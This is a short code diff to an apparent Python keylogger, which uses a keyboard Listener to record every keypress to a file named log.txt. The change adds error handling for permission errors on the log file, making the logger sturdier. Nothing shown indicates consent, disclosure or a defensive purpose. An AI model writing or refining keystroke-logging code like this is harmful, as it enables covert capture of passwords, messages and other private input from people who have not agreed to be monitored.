@@ -8,8 +8,11 @@ def log_key(key):
         key = "\n"
     elif key.startswith("Key."):
         key = ""
-    with open("log.txt", 'a') as log_file:
-        log_file.write(key)
+    try:
+        with open("log.txt", 'a') as log_file:
+            log_file.write(key)
+    except PermissionError:
+        print("Permission denied: 'log.txt'")
 
 def start_logging():
     with Listener(on_press=log_key) as listener:
